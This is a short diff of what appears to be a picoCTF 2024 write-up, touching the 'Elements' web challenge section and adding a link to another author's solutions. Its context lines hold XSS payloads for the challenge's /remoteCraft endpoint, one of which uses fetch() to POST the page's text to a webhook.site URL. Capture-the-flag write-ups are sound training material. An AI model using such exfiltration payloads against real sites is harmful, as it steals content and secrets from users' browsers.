@@ -688,11 +688,8 @@ http://rhea.picoctf.net:52830/remoteCraft?recipe={"recipe":[["Fire","Water"]],"x
 /remoteCraft?recipe={"recipe":[["Fire","Water"]],"xss":"fetch('https://webhook.site/89a33e4d-1e15-48e6-bdb8-0df74726398b', { method: 'POST', body: JSON.stringify({ flag: document.querySelector('body').innerText }) })"}
 
 /remoteCraft?recipe={"recipe":[["Fire","Water"]],"xss":"encodeURIComponent("fetch('/flag.txt').then(response => response.text()).then(data => alert(data));")"}
-
-
-
 ```
-
+https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024/elements?ref=blog.qz.sg
 
 
 # Cryptography (5)
